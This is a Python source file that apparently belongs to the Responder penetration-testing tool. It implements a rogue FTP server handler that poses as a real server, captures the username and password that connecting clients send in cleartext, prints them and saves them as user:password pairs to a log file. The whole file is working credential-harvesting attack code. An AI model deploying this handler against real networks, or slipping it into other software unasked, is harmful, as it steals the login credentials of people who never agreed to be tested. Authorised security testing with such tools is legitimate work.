import os
import settings

from SocketServer import BaseRequestHandler
from packets import FTPPacket
from utils import *

class FTP(BaseRequestHandler):

	def handle(self):
		Outfile = os.path.join(settings.Config.ResponderPATH, 'logs', "FTP-Clear-Text-Password-%s.txt" % self.client_address[0])
		
		try:
			self.request.send(str(FTPPacket()))
			data = self.request.recv(1024)

			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				print text("[FTP] Username : ", color(User, 3, 0))

				Packet = FTPPacket(Code="331",Message="User name okay, need password.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")

				print text("[FTP] Password : ", color(Pass, 3, 0))

				Packet = FTPPacket(Code="530",Message="User not logged in.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

				WriteData(Outfile,User+":"+Pass, User+":"+Pass)

			else :
				Packet = FTPPacket(Code="502",Message="Command not implemented.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

		except Exception:
			pass